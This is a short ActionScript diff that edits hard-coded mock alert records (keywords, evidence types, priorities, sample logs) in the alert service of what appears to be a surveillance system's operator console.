@@ -15,17 +15,19 @@ package it.ht.rcs.console.alert.rest
     public function all(onResult:Function=null, onFault:Function=null):void
     {
       var items:ArrayCollection = new ArrayCollection();
-      items.addItem(new Alert({_id: '1', enabled:true, suppression: 600, type: 'MAIL', action: 'EVIDENCE', keywords: "HT", priority: 2, evidence: 'ANY', path:new ArrayCollection([]), 
+      items.addItem(new Alert({_id: '1', enabled:false, suppression: 600, type: 'LOG', action: 'EVIDENCE', keywords: "secret", priority: 1, evidence: 'PRINT', path:new ArrayCollection(['1', '2', '3'])}) );
+      items.addItem(new Alert({_id: '2', enabled:true, suppression: 600, type: 'MAIL', action: 'EVIDENCE', keywords: "HT", priority: 2, evidence: '*', path:new ArrayCollection([]), 
                                 logs:new ArrayCollection([new AlertLog({time: new Date().time / 1000, path: new ArrayCollection(['1', '2', '3']), evidence: new ArrayCollection([2132468])})])
                     }));
-      items.addItem(new Alert({_id: '2', enabled:true, suppression: 600, type: 'LOG', action: 'EVIDENCE', keywords: "bomb", priority: 3, evidence: 'ANY', path:new ArrayCollection(['1', '2']), 
+      items.addItem(new Alert({_id: '3', enabled:true, suppression: 600, type: 'LOG', action: 'EVIDENCE', keywords: "bomb", priority: 3, evidence: '*', path:new ArrayCollection(['1', '2']), 
                                 logs:new ArrayCollection([new AlertLog({time: new Date().time / 1000, path: new ArrayCollection(['1', '2', '3']), evidence: new ArrayCollection([654324])}),
                                                           new AlertLog({time: new Date().time / 1000, path: new ArrayCollection(['1', '2', '3']), evidence: new ArrayCollection([367670123])})
                                 ])
                     }));
-      items.addItem(new Alert({_id: '3', enabled:false, suppression: 600, type: 'LOG', action: 'EVIDENCE', keywords: "RCS", priority: 3, evidence: 'KEYLOG', path:new ArrayCollection(['1', '2', '3'])}) );
-      items.addItem(new Alert({_id: '4', enabled:true, suppression: 600, type: 'MAIL', action: 'SYNC', path:new ArrayCollection(['1', '2', '3'])}) );
-
+      items.addItem(new Alert({_id: '4', enabled:false, suppression: 600, type: 'LOG', action: 'EVIDENCE', keywords: "RCS", priority: 4, evidence: 'KEYLOG', path:new ArrayCollection(['1', '2', '3'])}) );
+      items.addItem(new Alert({_id: '5', enabled:true, suppression: 600, type: 'MAIL', action: 'SYNC', path:new ArrayCollection(['1', '2', '3'])}) );
+      items.addItem(new Alert({_id: '6', enabled:true, suppression: 600, type: 'MAIL', action: 'INSTANCE', path:new ArrayCollection(['1', '2'])}) );
+      
       var event:ResultEvent = new ResultEvent("alert.index", false, true, items);
       if (onResult != null) 
         onResult(event);
